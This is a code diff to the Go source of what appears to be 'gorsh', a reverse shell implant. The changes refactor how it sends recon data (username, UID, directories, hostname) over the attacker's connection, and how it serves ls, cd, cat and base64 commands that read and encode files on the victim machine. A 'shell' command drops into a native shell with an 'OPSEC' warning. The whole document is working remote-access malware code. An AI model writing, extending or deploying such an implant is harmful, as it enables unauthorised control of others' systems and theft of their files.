@@ -15,8 +15,8 @@ import (
 	"os/user"
 	"strings"
 
-	"github.com/audibleblink/gorsh/shell"
 	"code.cloudfoundry.org/bytefmt"
+	"github.com/audibleblink/gorsh/shell"
 )
 
 const (
@@ -38,41 +38,66 @@ func Encode(path string) (string, error) {
 	return base64.StdEncoding.EncodeToString(buff), nil
 }
 
+func Send(conn net.Conn, msg string) {
+	conn.Write([]byte("\n"))
+	conn.Write([]byte(msg))
+	conn.Write([]byte("\n"))
+}
+
 func Intel(conn net.Conn) {
 	user, _ := user.Current()
-	userBlock := fmt.Sprintf("\n[User]\nusername=%s\nid=%s\n", user.Name, user.Uid)
+	userBlock := fmt.Sprintf("[User]\nusername=%s\nid=%s", user.Username, user.Uid)
+	Send(conn, userBlock)
 
 	dir, _ := os.Getwd()
-	dirBlock := fmt.Sprintf("\n[Directory]\nCurrent=%s\nHome=%s\n", dir, user.HomeDir)
+	dirBlock := fmt.Sprintf("[Directory]\nCurrent=%s\nHome=%s", dir, user.HomeDir)
 
-	conn.Write([]byte(userBlock + dirBlock))
+	Send(conn, dirBlock)
+}
+
+func ListDir(argv []string) (string, error) {
+	var path string
+
+	if len(argv) < 2 {
+		path = "./"
+	}
+
+	files, err := ioutil.ReadDir(path)
+
+	if err != nil {
+		return "", err
+	}
+
+	details := ""
+
+	for _, f := range files {
+		perms := f.Mode().String()
+		size := bytefmt.ByteSize(uint64(f.Size()))
+		modTime := f.ModTime().String()[0:19]
+		name := f.Name()
+		details = details + perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"
+	}
+
+	return details, nil
 }
 
 // takes a network connection as its arg so it can pass stdio to it
 func InteractiveShell(conn net.Conn) {
 	var (
-		exit    bool   = false
-		name, _        = os.Hostname()
-		prompt  string = fmt.Sprintf("[%s]> ", name)
-
-		// buffered i/o. stdin/out library
-		// TODO: why the asterisk on the scanner type declaration
+		exit    bool           = false
+		name, _                = os.Hostname()
+		prompt  string         = fmt.Sprintf("\n[%s]> ", name)
 		scanner *bufio.Scanner = bufio.NewScanner(conn)
 	)
 
 	// Print basic recon data on first connect
 	Intel(conn)
-	// write the byte array that is our prompt to the net connection
 	conn.Write([]byte(prompt))
 
-	// looks like the equivalent of a while loop that listens for user
-	// input
 	for scanner.Scan() {
-		// Grab user input
 		command := scanner.Text()
 
 		if len(command) > 1 {
-			// split the user input on whitespace
 			argv := strings.Split(command, " ")
 
 			switch argv[0] {
@@ -80,57 +105,60 @@ func InteractiveShell(conn net.Conn) {
 				exit = true
 
 			case "shell":
-				conn.Write([]byte("Mind your OPSEC\n"))
+				Send(conn, "Mind your OPSEC")
 				RunShell(conn)
 
 			case "ls":
-				files, _ := ioutil.ReadDir("./")
-
-				for _, f := range files {
-					perms := f.Mode().String()
-					size := bytefmt.ByteSize(uint64(f.Size()))
-					modTime := f.ModTime().String()[0:19]
-					name := f.Name()
-					conn.Write([]byte(perms + "\t" + modTime + "\t" + size + "\t" + name + "\n"))
+				listing, err := ListDir(argv)
+				if err != nil {
+					Send(conn, err.Error())
+				} else {
+					Send(conn, listing)
 				}
-				conn.Write([]byte("\n"))
 
 			case "cd":
-				os.Chdir(argv[1])
+				if len(argv) > 1 {
+					os.Chdir(argv[1])
+				} else {
+					usr, _ := user.Current()
+					os.Chdir(usr.HomeDir)
+				}
 				dir, _ := os.Getwd()
-				conn.Write([]byte("Directory: " + dir + "\n"))
+				Send(conn, "Directory: "+dir)
 
 			case "pwd":
 				dir, _ := os.Getwd()
-				conn.Write([]byte(dir + "\n"))
+				Send(conn, dir)
 
 			case "cat":
 				buf, err := ioutil.ReadFile(argv[1])
 
 				if err != nil {
-					conn.Write([]byte(err.Error()))
+					Send(conn, err.Error())
 				} else {
-					conn.Write([]byte("\n" + string(buf) + "\n\n"))
+					Send(conn, string(buf))
 				}
 
 			case "base64":
 				base64, err := Encode(argv[1])
 
 				if err != nil {
-					conn.Write([]byte(err.Error()))
+					Send(conn, err.Error())
 				} else {
-					conn.Write([]byte("\n" + base64 + "\n\n"))
+					Send(conn, base64)
 				}
 
 			case "help":
-				conn.Write([]byte("Currently implemented commands: \n" +
-					"cd <path>     -  Change the processe's working directory\n" +
-					"ls            -  List the current working directory\n" +
-					"pwd           -  Print the current working directory\n" +
-					"cat <file>    -  Print the contents of the given file\n" +
-					"base64 <file> -  Base64 encode the given file and print\n\n"))
+				Send(conn, "Currently implemented commands: \n"+
+					"cd <path>     -  Change the processe's working directory\n"+
+					"ls            -  List the current working directory\n"+
+					"pwd           -  Print the current working directory\n"+
+					"cat <file>    -  Print the contents of the given file\n"+
+					"base64 <file> -  Base64 encode the given file and print\n"+
+					"shell         -  Drops into a native shell. Mind your OPSEC\n"+
+					"\n")
 			default:
-				conn.Write([]byte("Command not implemented. Try 'help'\n"))
+				Send(conn, "Command not implemented. Try 'help'")
 			}
 
 			if exit {
